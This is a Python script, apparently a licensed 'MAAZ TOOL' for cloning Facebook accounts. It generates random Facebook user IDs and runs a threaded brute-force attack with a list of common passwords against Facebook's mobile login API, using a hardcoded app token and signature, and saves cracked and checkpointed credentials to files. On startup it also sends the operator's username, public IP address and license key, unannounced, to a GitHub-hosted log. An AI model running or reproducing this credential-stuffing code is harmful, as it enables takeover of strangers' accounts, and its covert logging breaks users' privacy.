#!/usr/bin/env python3
# -- coding: utf-8 --

import os
import sys
import time
import uuid
import json
import base64
import random
import threading
import requests
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress

console = Console()

# GitHub Key System Config
APPROVED_KEYS_URL = "https://raw.githubusercontent.com/Labbaik757/Labbaik-Official/main/keys/approved_keys.txt"
LOG_UPLOAD_REPO = "Labbaik757/labbaik-logs"
LOG_UPLOAD_PATH = "logs.txt"
GITHUB_TOKEN = "ghp_xxxREPLACEMExxx"  # Replace with actual token

BANNER = """[bold cyan]
███████╗ █████╗ ███████╗███████╗
██╔════╝██╔══██╗╚══███╔╝██╔════╝
█████╗  ███████║  ███╔╝ █████╗  
██╔══╝  ██╔══██║ ███╔╝  ██╔══╝  
██║     ██║  ██║███████╗███████╗
╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
     🔰 MAAZ TOOL 🔰
[/bold cyan]"""

def show_banner():
    console.print(Panel(BANNER, style="bold cyan"))

def fetch_approved_keys():
    try:
        response = requests.get(APPROVED_KEYS_URL)
        if response.status_code == 200:
            return response.text.splitlines()
    except:
        return []
    return []

def is_key_valid(user_key):
    return user_key.strip() in fetch_approved_keys()

def upload_log(username, key):
    try:
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip = requests.get("https://api.ipify.org").text.strip()
        log_line = f"[{now}] USERNAME: {username} | IP: {ip} | KEY: {key}\n"

        url = f"https://api.github.com/repos/{LOG_UPLOAD_REPO}/contents/{LOG_UPLOAD_PATH}"
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json"
        }

        res = requests.get(url, headers=headers)
        if res.status_code == 200:
            sha = res.json()['sha']
            old_content = requests.get(res.json()['download_url']).text
            updated_content = old_content + log_line
        else:
            sha = None
            updated_content = log_line

        encoded = base64.b64encode(updated_content.encode()).decode()
        data = {"message": "Update logs.txt", "content": encoded, "branch": "main"}
        if sha: data["sha"] = sha

        requests.put(url, headers=headers, json=data)
    except:
        pass

def fb_login(uid, pwd, ok_file, cp_file):
    headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"}
    data = {
        "email": uid,
        "pass": pwd,
        "login_source": "comet_log_in",
        "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "format": "JSON",
        "sdk_version": "2",
        "generate_session_cookies": "1",
        "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"
    }
    try:
        res = requests.post("https://b-api.facebook.com/method/auth.login", data=data, headers=headers).json()
        if "session_key" in res and "EAAA" in res.get("access_token", ""):
            console.print(f"[bold green][OK][/bold green] {uid}|{pwd}")
            ok_file.write(f"{uid}|{pwd}\n")
        elif "error_msg" in res and "www.facebook.com" in res["error_msg"]:
            console.print(f"[bold yellow][CP][/bold yellow] {uid}|{pwd}")
            cp_file.write(f"{uid}|{pwd}\n")
    except: pass

def brute_uid_clone():
    os.system('clear' if os.name == 'posix' else 'cls')
    show_banner()
    try:
        limit = int(os.environ.get("CLONE_LIMIT", "500"))
    except:
        console.print("[red]❌ Invalid environment input for CLONE_LIMIT[/red]")
        return

    uid_prefixes = ["100000", "100001", "100002", "100003", "100004"]
    uids = [random.choice(uid_prefixes) + str(random.randint(1111111, 9999999)) for _ in range(limit)]

    ok_file = open("OK.txt", "a")
    cp_file = open("CP.txt", "a")

    def attempt(uid):
        passwords = [
            "123456", "1234567", "12345678", "123456789", "1234567890",
            "786786", "112233", "000000", "password", "iloveyou", "qwerty",
            "facebook", "123123", "welcome", "pass123", "admin"
        ]
        for pwd in passwords:
            fb_login(uid, pwd, ok_file, cp_file)

    with Progress() as progress:
        task = progress.add_task("[green]Cloning...", total=limit)
        threads = []
        for uid in uids:
            t = threading.Thread(target=attempt, args=(uid,))
            t.start()
            threads.append(t)
            progress.update(task, advance=1)
        for t in threads: t.join()

    ok_file.close()
    cp_file.close()
    console.print("\n[bold green]\u2705 Brute Clone Done. Results saved in OK.txt and CP.txt[/bold green]")

def dashboard(username, key):
    os.system('clear' if os.name == 'posix' else 'cls')
    show_banner()
    console.print(f"[bold green]\U0001f9d1 User:[/bold green] [yellow]{username}[/yellow]")
    console.print(f"[bold green]\U0001f510 License:[/bold green] [yellow]{key}[/yellow]\n")

    table = Table(show_header=True, header_style="bold blue")
    table.add_column("Option")
    table.add_column("Cloning Method")
    table.add_row("3", "BRUTE UID CLONE")
    table.add_row("0", "Exit")
    console.print(table)

    opt = os.environ.get("CLONE_OPTION", "0")
    if opt == "0":
        console.print("[bold red]\U0001f44b Exiting...[/bold red]")
        return
    elif opt == "3":
        brute_uid_clone()
    else:
        console.print("[red]\u274c This method is not yet available.[/red]")


def check_dependencies():
    from pathlib import Path
    console.print("[bold cyan]\U0001f50d Checking dependencies and required files...[/bold cyan]")
    for file in ["OK.txt", "CP.txt"]:
        if not Path(file).exists():
            with open(file, "w"): pass
            console.print(f"[green]\u2714 Created:[/green] {file}")
    try:
        import requests, rich
    except:
        os.system("pip install requests rich")

def main():
    check_dependencies()
    os.system('clear' if os.name == 'posix' else 'cls')
    show_banner()
    key = os.environ.get("MAAZ_LICENSE_KEY")
    if not key:
        console.print("[bold yellow]⚠️ No license key found in environment (MAAZ_LICENSE_KEY). Exiting.[/bold yellow]")
        return
    if is_key_valid(key):
        username = os.getenv("USER") or "User"
        upload_log(username, key)
        dashboard(username, key)
    else:
        console.print("[bold red]\u274c Invalid or unapproved key. Contact admin.[/bold red]")

if __name__ == "__main__":
    main()
